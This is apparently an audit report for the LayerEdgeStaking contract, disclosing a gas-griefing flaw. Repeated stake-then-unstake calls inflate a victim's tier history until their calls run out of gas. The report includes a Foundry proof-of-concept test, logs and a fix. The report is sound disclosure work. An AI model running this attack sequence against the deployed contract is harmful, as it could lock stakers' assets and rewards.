# An attacker can significantly increase the size of the `stakerTierHistory` array.

### Summary

The ability to unstake immediately after staking allows the attacker to increase the size of the user's `stakerTierHistory` array.

### Root Cause

In `LayerEdgeStaking` a user can `unstake()` immediately after `stake()` because the check that the unstaking window is reached is in [`LayerEdgeStaking:763`](https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L763), and it is only performed when `completeUnstake()` is called.

At the moment when the increase of `stakerCountInTree` results in some user (the victim user) being promoted from one Tier to another, the attacker can `stake(minStakeAmount)` and then immediately `unstake()` at least 1 wei. So, the attacker first enters the Tree and Tier 3, which results in the victim user being promoted, and then exits the Tree but remains in Tier 3, and the length of the victim user's `stakerTierHistory` array increases by 2 elements. This action can be repeated by the attacker many times.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. The attacker can wait until the value of `stakerCountInTree` is such that adding one user to the tree will result in the victim user being promoted to Tier 2 or Tier 1 or enter the tree the required number of times.
2. Attacker calls `stake` function with amount = `minStakeAmount` (enters the Tree and increases `stakerCountInTree`).
3. Attacker calls `unstake` function with amount = `1 wei` (exits the Tree and decreases `stakerCountInTree`).
4. Attacker repeats step 1 and 2 (from different addresses).

### Impact

Increasing the size of the user's `stakerTierHistory` array causes the number of iterations in the loop in the `calculateUnclaimedInterest` function to increase. This leads to at least an increase in the cost of calling the functions `compoundInterest()`, `stake()`, `unstake()` and `claimInterest()`, but can also lead to the complete blocking of the user's ability to call these functions due to Out of Gas error. If affected users are unable to call the listed functions, they will lose all staked assets and earned rewards, and there is no other way to withdraw them (as well as to decrease the `stakerTierHistory` array). Moreover, for some values ​​of `stakerCountInTree`, the change in `stakerTierHistory` occurs not for one, but for three users at once.

### PoC
Paste in `LayerEdgeStakingTest.t.sol`:
```solidity
    function makeAddrAndStake(uint256 newStaker, uint256 amount) public returns (address staker) {
        staker = makeAddr(string(abi.encodePacked(newStaker)));
        // Distribute tokens to user
        vm.startPrank(admin);
        token.transfer(staker, amount);
        vm.stopPrank();
        //stake
        vm.startPrank(staker);
        token.approve(address(staking), amount);
        staking.stake(amount);
        vm.stopPrank();
    }

    function test_boostSomeStakerTierHistory() public {
        uint256 boostCount = 1000; // increase of `stakerTierHistoryLength` = boostCount * 2 
        uint256 n = 6; //amount of stakers before attack
        uint256 minAmount = staking.minStakeAmount();
        uint256 unstakeAmount = 1;
        address[] memory stakers = new address[](n + boostCount);
        address staker;
        // n users stake minStakeAmount
        for (uint256 i; i < n; i++) {
            staker = makeAddrAndStake(i + 1, minAmount);
            stakers[i] = staker;
        }
        uint256 victimIndex = 2;
        // in this example staker #3 (stakers[2]) is the victim
        // after next increase of `stakerCountInTree` staker n# will move to Tier2
        // initially stakerTierHistory.length should be = 1
        console2.log("Initial staker #3 stakerTierHistory.length = ", staking.stakerTierHistoryLength(stakers[victimIndex]));
        for (uint256 i; i < boostCount; i++) {
            staker = makeAddrAndStake(n + i + 1, minAmount);
            stakers[n - 1 + i] = staker;
            vm.startPrank(staker);
            staking.unstake(unstakeAmount);
            vm.stopPrank();
        }
        console2.log("After attack staker #3 stakerTierHistory.length = ", staking.stakerTierHistoryLength(stakers[victimIndex]));
    }
```
Logs:
```solidity
Logs:
  Initial staker #3 stakerTierHistory.length =  1
  After attack staker #3 stakerTierHistory.length =  2001
```

### Mitigation

It is recommended to check that unstaking window is reached in the `unstake` functon.
